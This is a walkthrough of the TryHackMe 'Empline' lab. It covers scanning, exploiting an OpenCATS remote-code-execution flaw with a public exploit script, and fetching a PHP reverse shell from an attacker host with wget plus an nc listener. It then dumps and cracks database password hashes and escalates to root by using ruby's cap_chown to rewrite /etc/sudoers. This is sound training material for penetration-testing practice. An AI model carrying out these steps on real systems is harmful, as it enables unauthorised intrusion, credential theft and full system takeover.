## Introduction
This is a medium challenge box on
[TryHackMe](https://tryhackme.com/r/room/empline){:target="_blank"}{:rel="noopener noreferrer"}
> This is what a hint will look like!

## Enumeration
### Port Scan
As always let's start with a port scan
```bash
rustscan -a VICTIM_IP -- -A -oA scan -sC
```
![rust-scan](/images/empline/empline-rustscan1.png)
![rust-scan2](/images/empline/empline-rustscan2.png)

There are only two ports open
- 22: SSH
- 80: HTTP

### Subdomains
> Did you fully investigate the homepage?

By investigating the web page source on port 80 
we see the following

![subdomain](/images/empline/empline-subdomain.png)

Let's add this to `/etc/hosts` so we can access the new
subdomain

```
VICTIM_IP job.empline.thm empline.thm
```

![jobs-home](/images/empline/empline-jobs-empline-home.png)

## Initial Foothold
> Are there public exploits for this service?

Let's check searchsploit for some exploits

```bash
searchsploit opencat
```

![searchsploit](/images/empline/empline-searchsploit.png)

Remote code execution is enticing, let's pull it and 
read the source

```bash
searchsploit -m 50585
cat 50585.sh
```

![exploit-src](/images/empline/empline-exploit-source.png)

Basically we provide a target and it'll upload a shell! 
Let's try it out

```bash
sh 50585.sh http://job.empline.thm/
```

![shell](/images/empline/empline-shell1.png)

It works! Only issue is we can't change directories and 
this isn't a full shell. For a better experience I'll 
upload a 
[php reverse shell](https://www.revshells.com/){:target="_blank"}{:rel="noopener noreferrer"}

```bash
# attacker machine, with shell.php in this directory
python3 -m http.server 80

# victim machine
wget http://ATTACKER_IP/shell.php
pwd
# /var/www/opencats/upload/careerportaladd

# attacker, listen
nc -lvnp 4444
```

We can see the directory `/upload/careerportaladd` so 
let's append that to the URL to run the shell

```
http://job.empline.thm/upload/careerportaladd/shell.php
```

Visit this site and we'll have a shell!

![php shell](/images/empline/empline-www-data-shell.png)

Stabilize and upgrade the shell with python3

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl+z
stty raw -echo && fg
export SHELL=/bin/bash
export TERM=screen
```

## Horizontal Escalation
> What other places could credentials be stored?

Now we'll investigate php config files

```bash
cat /var/www/opencats/config.php | grep DATABASE
```

![db-creds](/images/empline/empline-db-creds.png)

With these creds we can check for available usernames 
and passwords

```bash
mysql -u james -p
```

```sql
use opencats;
select user_name, password from user;
```

![db-dump](/images/empline/empline-db-dump.png)

Now lets check if any of these hashes have been 
cracked before using 
[this website](https://crackstation.net/){:target="_blank"}{:rel="noopener noreferrer"}

![cred-crack](/images/empline/empline-cracks.png)

We have a hit! This password is reused by george so let's 
switch accounts and continue

![george-shell](/images/empline/empline-george-shell.png)

## Root
> Are there any files with interesting permissions 
> or capabilities?

```bash
getcap -r / 2>/dev/null
```

![get-cap](/images/empline/empline-getcap.png)

Ruby has the cap_chown capability which allows it to 
change the ownership of files! To abuse this I referred to
[hacktricks for a template](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities#cap_chown){:target="_blank"}{:rel="noopener noreferrer"}

Let's give sudo permissions to george. First make 
`/etc/sudoers` writable by george

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1002, 1002, "/etc/sudoers")'
```

Add this to `/etc/sudoers`

```
%george ALL=(ALL:ALL) ALL
```
![sudoers-edit](/images/empline/empline-george-sudoers.png)

The sudoers file needs to be owned by root to function 
correctly, so let's revert these permissions

```bash
ruby -e 'require "fileutils"; FileUtils.chown(0, 0, "/etc/sudoers")'
```

If everything is set up correctly we should now be able 
to run `sudo` as george

```bash
sudo bash
```

## Recap
Homepage inspection leads to a subdomain hosting a career 
service vulnerable to remote code execution. This 
initial foothold gives us access to php configuration 
files with database credentials. Horizontal escalation 
is achieved by cracking passwords from the database. 
Ruby is given the change ownership capability allowing 
us to modify system files, giving our user root 
permissions.
